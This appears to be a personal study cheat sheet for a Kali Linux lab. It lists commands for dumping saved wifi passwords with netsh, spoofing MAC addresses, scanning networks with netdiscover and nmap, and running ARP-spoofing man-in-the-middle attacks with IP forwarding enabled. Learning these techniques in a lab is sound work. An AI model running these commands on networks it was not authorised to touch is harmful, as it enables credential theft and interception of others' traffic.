WINDOWS
# wifi passwords saved 
netsh wlan show profile
netsh wlan show profile Nome_da_rede key=clear

KALI LINUX DEBIAN VM
# shared folder with Main Machine
Configure in VMWARE the share folder and inside vm run commands:
connect share folder in configurations
cd /mnt/hgfs
sudo vim /etc/fstab
vmhgfs-fuse /mnt/hgfs fuse defaults,allow_other,nofail 0 0
sudo reboot now
ls /mnt/hgfs

# Docker in Kali Linux
sudo apt update
sudo apt upgrade docker.io

# ip configuration
ifconfig

#connect adaptor 
first disconect nat and then connect adapter wifi

# Anonymity
ifconfig wlan0 down
ifconfig wlan0 hw ether 00:11:22:33:44:55
ifconfig wlan0 up
ifconfig

#random mac address changer
sudo python3 mac_changer.py -i all

# network discover
## netdiscover
sudo netdiscover -r 192.168.1.1/24
## Python Script
sudo python network_scanner.py -t "192.168.1.1/24"
## nmap
sudo nmap --osscan-guess "192.168.1.1/24" 

# ARP SPOOF
## arpsoof
arpspoof -i eth0 -t 192.168.1.221 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.221
## python script
sudo python3 arp_spoof.py -t 192.168.1.109 -r 192.168.1.1

# liberate packages
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP
## ARP REQUEST
Broadcast MacAddress 
Who are mac Address x
## ARP RECEIVE
My Mac Address is x
## see MY ARP TABLE
arp -a 
## ARP RESPONSE

